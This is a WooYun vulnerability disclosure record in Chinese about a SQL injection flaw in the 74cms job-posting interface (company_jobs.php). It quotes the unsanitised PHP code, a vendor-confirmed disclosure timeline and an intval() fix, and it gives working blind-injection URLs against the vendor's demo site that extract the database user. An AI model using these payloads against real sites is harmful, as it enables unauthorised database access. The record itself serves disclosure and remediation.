{"id": 47179, "wybug_id": "wooyun-2014-081659", "wybug_title": "骑士CMS某接口SQL注入", "wybug_corp": "74c,s.com", "wybug_author": "龟兔赛跑", "wybug_date": "2014-11-04 15:17", "wybug_open_date": "2015-02-02 15:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-02：\t细节向公众公开  简要描述： 骑士CMS某接口SQL注入，官网测试。 详细说明：  翻了翻代码，看到有这么一段：user/company/company_jobs.php:\nelseif ($act=='jobs_perform'){\tglobal $_CFG;\t$yid =!empty($_POST['y_id'])?$_POST['y_id']:$_GET['y_id'];    \t$jobs_num=count($yid);\tif (empty($yid))\t{\tshowmsg(\"ÄãÃ»ÓÐÑ¡ÔñÖ°Î»£¡\",1);\t}\t\t$refresh=!empty($_POST['refresh'])?$_POST['refresh']:$_GET['refresh'];\t$delete=!empty($_POST['delete'])?$_POST['delete']:$_GET['delete'];    \tif ($refresh)\t{\t\tif($jobs_num==1){\t\t\tif(is_array($yid)){\t\t\t\t$yid = $yid[0];\t\t\t}\t\t\t$jobs_info = $db->getone(\"select * from \".table('jobs').\" where id=\".$yid);\t\t\tif(empty($jobs_info)){\t\t\t\t$jobs_info = $db->getone(\"select * from \".table('jobs_tmp').\" where id=\".$yid);\t\t\t}\t\t\tif($jobs_info['deadline']<time()){\t\t\t\tshowmsg(\"žÃÖ°Î»ÒÑµœÆÚ£¬ÇëÏÈÑÓÆÚ£¡\",1);\t\t\t}\t\t}\n下面的GET/POST参数没有check,\n$yid =!empty($_POST['y_id'])?$_POST['y_id']:$_GET['y_id']\n然后就带入了SQL：\n$jobs_info = $db->getone(\"select * from \".table('jobs').\" where id=\".$yid);\n这不是可以注入么？官网试试，果然是这样：\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19%27\n返回SQL错误：\n\n好了，试试盲注猜user():错误的返回：\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19 or strcmp(substr(user(),1,1),char(110))\n\n\n正确时候的返回：\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19 or strcmp(substr(user(),1,1),char(114))\n\n\n中间过程略，可以猜到：\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19 or strcmp(substr(user(),1,14),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))\n\n\n\n> select char(114,111,111,116,64,108,111,99,97,108,104,111,115,116);+------------------------------------------------------------+| char(114,111,111,116,64,108,111,99,97,108,104,111,115,116) |+------------------------------------------------------------+| root@localhost                                             |+------------------------------------------------------------+1 row in set (0.00 sec)\n   漏洞证明：  \nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19%27\n\n\n\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19 or strcmp(substr(user(),1,1),char(110))\n\n\n\nhttp://demo.74cms.com/user/company/company_jobs.php?act=jobs_perform&refresh=1&y_id=19 or strcmp(substr(user(),1,1),char(114))\n\n\n   修复方案：  $yid =!empty($_POST['y_id'])?intval($_POST['y_id']):intval($_GET['y_id']);   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-08 10:36 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}